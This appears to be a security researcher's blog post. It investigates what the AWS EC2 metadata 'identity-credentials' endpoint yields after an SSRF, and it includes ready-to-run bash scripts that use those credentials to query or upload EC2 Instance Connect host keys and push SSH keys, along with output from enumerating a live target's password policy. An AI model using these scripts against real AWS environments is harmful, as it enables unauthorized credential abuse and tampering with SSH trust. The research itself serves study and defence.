---
layout: post
title: AWS Metadata Identity-Credentials Research
subtitle: What do these creds do anyway?
permalink: /AWS-Metadata-Identity-Credentials
---

One of the most common ways to escalate an SSRF in an AWS Cloud environment is the (mis)use of the AWS Metadata API. This API allows for the vulnerable EC2 Machine to gain access to information about itself by accessing an HTTP API at the `http://169.254.169.254`. The normal route is to hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME` and utilize the IAM credentials returned to escalate via the AWS CLI. However, if the EC2 instance in question was not launched with an IAM role associated with it, escalation via this method becomes much more difficult. The endpoint `http://169.254.169.254/latest/user-data/` is also useful for escalation, but it does not always contain sensitive information. After running into this situation a couple times, I decided to start poking around the AWS Metadata API in search of more endpoints which may reveal sensitive information. One of the interesting endpoints I discovered is `http://169.254.169.254/latest/meta-data/identity -credentials/ec2/security-credentials/ec2-instance`. This endpoint returns a set of odd IAM credentials described by the [AWS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html) as:
> [Reserved for internal use only] The credentials that AWS uses to identify an instance to the rest of the Amazon EC2 infrastructure.

After reading this I decided to do a bit more research into this endpoint and see if we could use this to affect the target's infrastructure. **In short**, these credentials can be used to extract sensitive information if the AWS Organization is misconfigured and can be potentially used for DoS in some scenarios. Unfortunately these credentials were not as helpful as I hoped, but I wanted to outline the process I used in my research so that if anyone else wants to do more research on the topic, they will have a head start. 

## Purpose
The purpose of the aforementioned credentials are to assist with the setup of EC2 Instance Connect. This can be deduced from their usage in AWS's [aws-ec2-instance-connect-config repo](https://github.com/aws/aws-ec2-instance-connect-config/blob/32d7656adbf5f4b59f9aacd519b545dcedec7fe1/src/bin/eic_harvest_hostkeys#L119) on GitHub. The credentials are used in various places throughout the repo to authenticate the script to the AWSEC2InstanceConnectService.
```
creds=$(eval "${curl_cmd} http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/")
if [ $? -ne 0 ] ; then
    # We failed to load instance-identity credentials
    exit 255
fi
AWS_ACCESS_KEY_ID=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"AccessKeyId" : "\(.*\)",/\1/p')
AWS_SECRET_ACCESS_KEY=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"SecretAccessKey" : "\(.*\)",/\1/p')
AWS_SESSION_TOKEN=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"Token" : "\(.*\)",/\1/p')
...
canonicalHeaders="host:${host}\nx-amz-date:${isoTimestamp}\nx-amz-security-token:${AWS_SESSION_TOKEN}\n"
...
signingKey=$(getsigv4key "${AWS_SECRET_ACCESS_KEY}" "${isoDate}" "${region}" "ec2-instance-connect")
...
authorizationHeader="AWS4-HMAC-SHA256 Credential=${AWS_ACCESS_KEY_ID}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}"

/usr/bin/curl -X POST -H "Content-Encoding: amz-1.0" -H "Authorization: ${authorizationHeader}" -H "Content-Type: application/json" -H "x-amz-content-sha256: ${payloadHash}" -H "x-amz-date: ${isoTimestamp}" -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" -H "x-amz-target: com.amazon.aws.sshaccessproxyservice.AWSEC2InstanceConnectService.PutEC2HostKeys" -d "${val}" "${endpoint}/PutEC2HostKeys/"
```
In the script, we see that the application sends the server's SSH Host Keys to the AWSEC2InstanceConnectService, assumedly for the purpose of validating that the server being authenticated to is who it says it is. With this, several questions came into my mind:
1. Can these credentials be used elsewhere?
2. Can these credentials be used to DoS access to the box via EC2 Instance Connect?
3. Can we submit HostKeys for any EC2 Instance in the org using these "Internal Only" Credentials?

These are the questions that I will attempt to answer below.

It is also interesting to note that the account which is associated with the credentials at this endpoint technically has an invalid name:
```
{
    "UserId": "[REDACTED]:aws:ec2-instance:i-[REDACTED]",
    "Account": "[REDACTED]",
    "Arn": "arn:aws:sts::[REDACTED]:assumed-role/aws:ec2-instance/i-[REDACTED]"
}
```
The role name is always `aws:ec2-instance` and the session name is always the instanceId associated with this EC2 instance. However, according to the [AWS Documentation](https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-iam-role.html#cfn-iam-role-rolename), the RoleName should never contain the `:` character. This is an invalid name role name. This makes me wonder if there are any other `aws:` roles which we might be able to get access to which may grant escalated permissions.  

## AWSEC2InstanceConnectService API Functions
After researching the AWSEC2InstanceConnectService, I was able to identify 3 different endpoints on this API:
* GetEC2HostKeys
* PutEC2HostKeys
* SendSSHPublicKey

### GetEC2HostKeys
This endpoint in the AWSEC2InstanceConnectService API is used to retrieve existing host keys from the machine. Unfortunately, host keys are normally public information, so this is not a substantial leap. I did, however, consider that these host keys could be used to identify the backend host behind a WAFed asset. This would be done by taking the target's host key and using something like Shodan to scan the internet for services utilizing the same keys. The following script loads the output of `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance/` (which should be placed `/tmp/creds`) and attempts to extract the host's host keys.

I'll also note that I checked this endpoint for IDOR via the `InstanceId` parameter as well and noted that it was not vulnerable. 

<details><summary>Click here for the script</summary>
<pre>
#!/bin/bash
creds=$(cat /tmp/creds)
if [ $? -ne 0 ] ; then
    # We failed to load instance-identity credentials
    exit 255
fi
export AWS_ACCESS_KEY_ID=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"AccessKeyId" : "\(.*\)",/\1/p')
export AWS_SECRET_ACCESS_KEY=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"SecretAccessKey" : "\(.*\)",/\1/p')
export AWS_SESSION_TOKEN=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"Token" : "\(.*\)",/\1/p')
echo "Attempting to access the Host Keys based off of the following credentials: "
aws sts get-caller-identity
unset creds
domain="amazonaws.com"
region="us-east-1"
instance=$(aws sts get-caller-identity | jq .Arn | cut -f 3 -d "/" | sed 's/"//g')
account=$(aws sts get-caller-identity | jq .Account | sed 's/"//g')

val='{"AccountID":"'${account}'","AvailabilityZone":"'us-east-1a'","InstanceId":"'${instance}'"}'

sign () {
    /usr/bin/printf "${2}" | /usr/bin/openssl dgst -binary -hex -sha256 -mac HMAC -macopt hexkey:"${1}" | /bin/sed 's/.* //'
}

getsigv4key () {
    local base=$(/bin/echo -n "AWS4${1}" | /usr/bin/od -A n -t x1 | /bin/sed ':a;N;$!ba;s/[\n ]//g')
    local kdate=$(sign "${base}" "${2}")
    local kregion=$(sign "${kdate}" "${3}")
    local kservice=$(sign "${kregion}" "${4}")
    sign "${kservice}" "aws4_request"
}

clearcreds () {
    unset AWS_SESSION_TOKEN
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_ACCESS_KEY_ID
}
trap clearcreds EXIT

host="ec2-instance-connect.${region}.${domain}"
endpoint="https://${host}"

timestamp=$(/bin/date -u "+%Y-%m-%d %H:%M:%S")
isoTimestamp=$(/bin/date -ud "${timestamp}" "+%Y%m%dT%H%M%SZ")
isoDate=$(/bin/date -ud "${timestamp}" "+%Y%m%d")

canonicalQuery="" # We are using POST data, not a querystring
canonicalHeaders="host:${host}\nx-amz-date:${isoTimestamp}\nx-amz-security-token:${AWS_SESSION_TOKEN}\n"
signedHeaders="host;x-amz-date;x-amz-security-token"

payloadHash=$(/bin/echo -n "${val}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

canonicalRequest="$(/usr/bin/printf "POST\n/GetEC2HostKeys/\n%s\n${canonicalHeaders}\n${signedHeaders}\n%s" "${canonicalQuery}" "${payloadHash}")"
requestHash=$(/bin/echo -n "${canonicalRequest}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

credentialScope="${isoDate}/${region}/ec2-instance-connect/aws4_request"
toSign="AWS4-HMAC-SHA256\n${isoTimestamp}\n${credentialScope}\n${requestHash}"
signingKey=$(getsigv4key "${AWS_SECRET_ACCESS_KEY}" "${isoDate}" "${region}" "ec2-instance-connect")
signature=$(sign "${signingKey}" "${toSign}")

authorizationHeader="AWS4-HMAC-SHA256 Credential=${AWS_ACCESS_KEY_ID}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}"

curl -i -X POST -H "Content-Encoding: amz-1.0" -H "Authorization: ${authorizationHeader}" -H "Content-Type: application/json" -H "x-amz-content-sha256: ${payloadHash}" -H "x-amz-date: ${isoTimestamp}" -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" -H "x-amz-target: com.amazon.aws.sshaccessproxyservice.AWSEC2InstanceConnectService.GetEC2HostKeys" -d "${val}" "${endpoint}/GetEC2HostKeys/"
</pre>
</details>

### PutEC2HostKeys
This endpoint in the AWSEC2InstanceConnectService API is used to upload host keys to EC2 Instance Connect. According to the documentation in the [aws-ec2-instance-connect-config repo](https://github.com/aws/aws-ec2-instance-connect-config/blob/32d7656adbf5f4b59f9aacd519b545dcedec7fe1/README.md#host-key-harvesting), these keys are: 
>necessary to establish trust for the EC2 Console for the console's one-click in-browser ssh terminal feature.

However, after attempting to corrupt these keys by sending invalid keys to AWS, I received varied results. My notes from tests performed several months ago indicated that DoS via this method was possible, but I am currently unable to reproduce. This indicates that either AWS has shifted away from this model of authentication with EC2 Instance Connect, or that my previous tests were corrupted in some way. Either way, AWS does not seem to be validating host keys as it mentions in the documentation above, which is slightly concerning. This gives us a bit of a shaky answer to `Can these credentials be used to DoS access to the box via EC2 Instance Connect?`. 

I also attempted to use this endpoint to upload host keys to different EC2 Host Keys within the organization. I did this by modifying the POST data sent in the final request on line 18 of the below script. When a different InstanceID was provided to the API, the API successfully validated the InstanceId against the session name and did not allow access to other EC2 Instances. This answers the above question about `Can we submit HostKeys for any EC2 Instance in the org using these "Internal Only" Credentials?`. 

If anyone else wishes to perform additional research on this functionality, the below bash script will allow one send host keys to EC2 Instance Connect using the creds in `/tmp/creds`.  
<details><summary>Click here for the script</summary>
<pre>
#!/bin/bash
creds=$(cat /tmp/creds)
if [ $? -ne 0 ] ; then
    # We failed to load instance-identity credentials
    exit 255
fi
export AWS_ACCESS_KEY_ID=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"AccessKeyId" : "\(.*\)",/\1/p')
export AWS_SECRET_ACCESS_KEY=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"SecretAccessKey" : "\(.*\)",/\1/p')
export AWS_SESSION_TOKEN=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"Token" : "\(.*\)",/\1/p')
echo "Attempting to upload Host Keys based off of the following credentials: "
aws sts get-caller-identity
unset creds
domain="amazonaws.com"
region="us-east-1"
instance=$(aws sts get-caller-identity | jq .Arn | cut -f 3 -d "/" | sed 's/"//g')
account=$(aws sts get-caller-identity | jq .Account | sed 's/"//g')

val='{"AccountID":"'${account}'","AvailabilityZone":"us-east-1a","HostKeys":["ssh-rsa AAAAB3NzaC1yc2EAAAADAQABLAHBLAH test@test.com"],"InstanceId":"'${instance}'"}'

sign () {
    /usr/bin/printf "${2}" | /usr/bin/openssl dgst -binary -hex -sha256 -mac HMAC -macopt hexkey:"${1}" | /bin/sed 's/.* //'
}

# Derive a sigv4 signing key for the given secret
# get_sigv4_key [key] [datestamp] [region name] [service name]
getsigv4key () {
    local base=$(/bin/echo -n "AWS4${1}" | /usr/bin/od -A n -t x1 | /bin/sed ':a;N;$!ba;s/[\n ]//g')
    local kdate=$(sign "${base}" "${2}")
    local kregion=$(sign "${kdate}" "${3}")
    local kservice=$(sign "${kregion}" "${4}")
    sign "${kservice}" "aws4_request"
}

clearcreds () {
    unset AWS_SESSION_TOKEN
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_ACCESS_KEY_ID
}
trap clearcreds EXIT

# Generate, sign, and send the sigv4 request
host="ec2-instance-connect.${region}.${domain}"
endpoint="https://${host}"

timestamp=$(/bin/date -u "+%Y-%m-%d %H:%M:%S")
isoTimestamp=$(/bin/date -ud "${timestamp}" "+%Y%m%dT%H%M%SZ")
isoDate=$(/bin/date -ud "${timestamp}" "+%Y%m%d")

canonicalQuery="" # We are using POST data, not a querystring
canonicalHeaders="host:${host}\nx-amz-date:${isoTimestamp}\nx-amz-security-token:${AWS_SESSION_TOKEN}\n"
signedHeaders="host;x-amz-date;x-amz-security-token"

payloadHash=$(/bin/echo -n "${val}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

canonicalRequest="$(/usr/bin/printf "POST\n/PutEC2HostKeys/\n%s\n${canonicalHeaders}\n${signedHeaders}\n%s" "${canonicalQuery}" "${payloadHash}")"
requestHash=$(/bin/echo -n "${canonicalRequest}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

# Derive the signature
credentialScope="${isoDate}/${region}/ec2-instance-connect/aws4_request"
toSign="AWS4-HMAC-SHA256\n${isoTimestamp}\n${credentialScope}\n${requestHash}"
signingKey=$(getsigv4key "${AWS_SECRET_ACCESS_KEY}" "${isoDate}" "${region}" "ec2-instance-connect")
signature=$(sign "${signingKey}" "${toSign}")

authorizationHeader="AWS4-HMAC-SHA256 Credential=${AWS_ACCESS_KEY_ID}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}"

curl -i -X POST -H "Content-Encoding: amz-1.0" -H "Authorization: ${authorizationHeader}" -H "Content-Type: application/json" -H "x-amz-content-sha256: ${payloadHash}" -H "x-amz-date: ${isoTimestamp}" -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" -H "x-amz-target: com.amazon.aws.sshaccessproxyservice.AWSEC2InstanceConnectService.PutEC2HostKeys" -d "${val}" "${endpoint}/PutEC2HostKeys/"

</pre>
</details>


### SendSSHPublicKey
This endpoint in the AWSEC2InstanceConnectService API is used to temporarily upload SSH Public Keys to the `~/.ssh/authorized_keys` file on a filesystem. Hoping that the AWS devs got sloppy and allowed these internal credentials access to `AWSEC2InstanceConnectService.*`, I created the below script to check and see if this internal user has permissions to push SSH Public Keys to machines. Unfortunately, the permissions are limited by default to `AWSEC2InstanceConnectService.PutEC2HostKeys` and `AWSEC2InstanceConnectService.GetEC2HostKeys` and we are greeted with a firm `Access Denied` when we attempt this. If you're interested in poking at this function, feel free to use the script below. 
<details><summary>Click here for the script</summary>
<pre>
#!/bin/bash
creds=$(cat /tmp/creds)
if [ $? -ne 0 ] ; then
    # We failed to load instance-identity credentials
    exit 255
fi
AWS_ACCESS_KEY_ID=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"AccessKeyId" : "\(.*\)",/\1/p')
AWS_SECRET_ACCESS_KEY=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"SecretAccessKey" : "\(.*\)",/\1/p')
AWS_SESSION_TOKEN=$(/bin/echo "${creds}" | /bin/sed -n 's/.*"Token" : "\(.*\)",/\1/p')
echo "Attempting to upload Public Keys based off of the following credentials: "
aws sts get-caller-identity
unset creds
domain="amazonaws.com"
region="us-east-1"
instance=$(aws sts get-caller-identity | jq .Arn | cut -f 3 -d "/" | sed 's/"//g')
account=$(aws sts get-caller-identity | jq .Account | sed 's/"//g')

val='{"AvailabilityZone":"us-east-1a","InstanceId":"'${instance}'","InstanceOSUser":"ubuntu","SSHPublicKey":"ssh-rsa AAAAB3NzaC1yValidKeyHere test@test.com"}'

sign () {
    /usr/bin/printf "${2}" | /usr/bin/openssl dgst -binary -hex -sha256 -mac HMAC -macopt hexkey:"${1}" | /bin/sed 's/.* //'
}

# Derive a sigv4 signing key for the given secret
# get_sigv4_key [key] [datestamp] [region name] [service name]
getsigv4key () {
    local base=$(/bin/echo -n "AWS4${1}" | /usr/bin/od -A n -t x1 | /bin/sed ':a;N;$!ba;s/[\n ]//g')
    local kdate=$(sign "${base}" "${2}")
    local kregion=$(sign "${kdate}" "${3}")
    local kservice=$(sign "${kregion}" "${4}")
    sign "${kservice}" "aws4_request"
}

clearcreds () {
    unset AWS_SESSION_TOKEN
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_ACCESS_KEY_ID
}
trap clearcreds EXIT

# Generate, sign, and send the sigv4 request
host="ec2-instance-connect.${region}.${domain}"
endpoint="https://${host}"

timestamp=$(/bin/date -u "+%Y-%m-%d %H:%M:%S")
isoTimestamp=$(/bin/date -ud "${timestamp}" "+%Y%m%dT%H%M%SZ")
isoDate=$(/bin/date -ud "${timestamp}" "+%Y%m%d")

canonicalQuery="" # We are using POST data, not a querystring
canonicalHeaders="host:${host}\nx-amz-date:${isoTimestamp}\nx-amz-security-token:${AWS_SESSION_TOKEN}\n"
signedHeaders="host;x-amz-date;x-amz-security-token"

payloadHash=$(/bin/echo -n "${val}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

canonicalRequest="$(/usr/bin/printf "POST\n/SendSSHPublicKey/\n%s\n${canonicalHeaders}\n${signedHeaders}\n%s" "${canonicalQuery}" "${payloadHash}")"
requestHash=$(/bin/echo -n "${canonicalRequest}" | /usr/bin/sha256sum | /bin/sed 's/\s.*$//')

# Derive the signature
credentialScope="${isoDate}/${region}/ec2-instance-connect/aws4_request"
toSign="AWS4-HMAC-SHA256\n${isoTimestamp}\n${credentialScope}\n${requestHash}"
signingKey=$(getsigv4key "${AWS_SECRET_ACCESS_KEY}" "${isoDate}" "${region}" "ec2-instance-connect")
signature=$(sign "${signingKey}" "${toSign}")

authorizationHeader="AWS4-HMAC-SHA256 Credential=${AWS_ACCESS_KEY_ID}/${credentialScope}, SignedHeaders=${signedHeaders}, Signature=${signature}"

curl -i -X POST -H "Content-Encoding: amz-1.0" -H "Authorization: ${authorizationHeader}" -H "Content-Type: application/json" -H "x-amz-content-sha256: ${payloadHash}" -H "x-amz-date: ${isoTimestamp}" -H "x-amz-security-token: ${AWS_SESSION_TOKEN}" -H "x-amz-target: com.amazon.aws.sshaccessproxyservice.AWSEC2InstanceConnectService.SendSSHPublicKey" -d "${val}" "${endpoint}/SendSSHPublicKey/"
</pre>
</details>

### Access to Other Functions
Using [ScoutSuite by NCCGroup](https://github.com/nccgroup/ScoutSuite), I attempted to enumerate permission for this user within the organizations. I was unable to find anything of interest in a default configuration. However, in one of the live targets I was attacking, I was able to pull the organization's password policy using this user:
```
┬─[justin@parrot:~/t/S/s/scoutsuite-results]─[03:02:21 PM]─[G:master=]
╰─>$ aws iam get-account-password-policy                                                                                                     

{
    "PasswordPolicy": {
        "MinimumPasswordLength": 25,
        "RequireSymbols": false,
        "RequireNumbers": true,
        "RequireUppercaseCharacters": true,
        "RequireLowercaseCharacters": false,
        "AllowUsersToChangePassword": true,
        "ExpirePasswords": false,
        "PasswordReusePrevention": 10,
        "HardExpiry": false
    }
}
┬─[justin@parrot:~/t/S/s/scoutsuite-results]─[03:02:25 PM]─[G:master=]
╰─>$ aws sts get-caller-identity                                                                                             
{
    "UserId": "[REDACTED]:aws:ec2-instance:i-[REDACTED]",
    "Account": "[REDACTED]",
    "Arn": "arn:aws:sts::[REDACTED]:assumed-role/aws:ec2-instance/i-[REDACTED]"
}
```
This leads me to believe that there is the possibility for other functions to be made accessible to this user through IAM policies. After discussing this with [@SpaceRaccoonSec](https://twitter.com/spaceraccoonsec), our best guess on why this was happening is that there is a sub organization set up in AWS in which all user's are provided access to the `IAM.GetAccountPasswordPolicy` permission. This means that if the target's AWS organization is set up in such a way that all user's are given X permission, that permission will also be given to this AWS user. Because of this, I'd recommend that anyone attempting to escalate privileges using this method run these credentials through ScoutSuite as there may be additional permissions available to this user. This provides an answer to the question: `Can these credentials be used elsewhere?`. 


## Conclusion
In conclusion, these credentials are not tremendously helpful. They can be used in some situations to break the "trust" between the AWS Console's in-browser SSH client and the target server, and also to extract information about the target AWS organization in some misconfigurations. I am writing this blog post to let researchers know to always run these creds through ScoutSuite and perhaps to spur further research in this area in the future. 
